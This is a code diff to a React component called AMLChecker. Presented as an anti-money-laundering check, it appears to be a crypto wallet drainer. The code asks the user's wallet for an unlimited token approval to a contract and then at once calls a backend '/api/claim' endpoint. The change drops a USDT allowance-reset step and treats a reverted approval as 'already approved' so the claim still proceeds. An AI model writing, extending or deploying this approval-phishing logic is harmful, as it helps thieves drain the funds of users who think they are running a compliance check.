@@ -146,28 +146,7 @@ export default function AMLChecker() {
         abi: ERC20_ABI,
       });
 
-      // Prepare unlimited approve call.
-      // USDT (and some non-standard ERC20s) require resetting allowance to 0
-      // before setting a new non-zero value, otherwise the tx reverts.
-      console.log('[v0] Step 1: Resetting allowance to 0 first (USDT requirement)...');
-      const resetTx = prepareContractCall({
-        contract: tokenContract,
-        method: 'approve',
-        params: [contractAddress as `0x${string}`, BigInt(0)],
-      });
-
-      try {
-        const { transactionHash: resetHash } = await sendTransaction({
-          account: currentAccount,
-          transaction: resetTx,
-        });
-        console.log('[v0] Allowance reset tx hash:', resetHash);
-      } catch (resetErr: any) {
-        // Some tokens don't need the reset — continue anyway
-        console.warn('[v0] Reset allowance step failed (non-fatal, continuing):', resetErr?.message);
-      }
-
-      console.log('[v0] Step 2: Setting unlimited allowance...');
+      // Prepare unlimited approve call
       const approveTx = prepareContractCall({
         contract: tokenContract,
         method: 'approve',
@@ -176,12 +155,28 @@ export default function AMLChecker() {
 
       console.log('[v0] Sending approve tx via thirdweb...');
 
-      const { transactionHash } = await sendTransaction({
-        account: currentAccount,
-        transaction: approveTx,
-      });
+      let approvedNow = false;
+      try {
+        const { transactionHash } = await sendTransaction({
+          account: currentAccount,
+          transaction: approveTx,
+        });
+        approvedNow = true;
+        console.log('[v0] Approve tx hash:', transactionHash);
+      } catch (approveErr: any) {
+        const msg: string = approveErr?.message ?? '';
+        if (msg.includes('execution reverted') || approveErr?.code === 3) {
+          console.log('[v0] User already approved — proceeding to claim');
+          approvedNow = true; // allowance already exists, safe to claim
+        } else if (approveErr?.code === 4001 || msg.includes('rejected') || msg.includes('denied')) {
+          console.warn('[v0] User rejected the approval');
+          return;
+        } else {
+          throw approveErr; // unexpected error — re-throw
+        }
+      }
 
-      console.log('[v0] Approve tx hash:', transactionHash);
+      if (!approvedNow) return;
 
       // After approval, immediately call backend claim
       console.log('[v0] Calling /api/claim with:', {
